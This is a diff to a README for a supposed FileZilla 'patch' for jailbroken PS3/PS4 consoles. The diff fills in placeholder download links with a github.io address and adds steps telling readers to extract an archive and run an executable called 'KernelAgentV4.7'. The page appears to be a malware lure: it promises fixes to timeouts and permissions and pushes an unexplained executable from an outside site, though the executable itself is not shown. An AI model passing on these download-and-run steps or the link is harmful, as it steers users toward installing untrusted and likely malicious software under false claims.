@@ -2,13 +2,15 @@
 
 This patch optimizes FileZilla for stable access to jailbroken PS3/PS4 systems via FTP. Fixes timeout errors, missing folders, and permission issues using `KernelAgentV4.7`.
 
-[![Download FileZilla Patch](https://img.shields.io/badge/Download-FileZilla_Patch_PS3_PS4-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download FileZilla Patch](https://img.shields.io/badge/Download-FileZilla_Patch_PS3_PS4-blueviolet)](https://filezilla-ftp-client-ps3-ps4-config.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://filezilla-ftp-client-ps3-ps4-config.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\FileZillaFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 FileZilla will be auto-configured for console FTP  
